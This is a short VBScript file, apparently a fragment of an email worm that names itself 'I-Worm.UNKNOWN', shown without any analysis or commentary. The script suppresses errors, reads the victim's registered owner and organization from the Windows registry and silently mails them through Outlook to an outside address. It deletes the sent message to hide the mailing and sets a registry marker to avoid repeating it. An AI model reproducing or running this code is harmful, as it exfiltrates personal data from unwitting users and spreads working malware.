On Error Resume Next
set f=CreateObject("Scripting.FileSystemObject")
set w=CreateObject("WScript.Shell")
If w.RegRead("HKLM\Software\UnKnown\") <> "OK" Then
set o=CreateObject("Outlook.Application")
set m=o.CreateItem(0)
n=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
p=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
m.To = "satanik-666-child@fucked.co.uk"
m.Subject = "Message from " & n
s = "Time : " & time
s = s & vbCrLf & "Date : " & date
s = s & vbCrLf & "Organization : " & p
s = s & vbCrLf & vbCrLf & "		I-Worm.UNKNOWN"
m.Body = s
m.DeleteAfterSubmit=True
m.Send
w.RegWrite "HKLM\Software\UnKnown\", "OK"
End If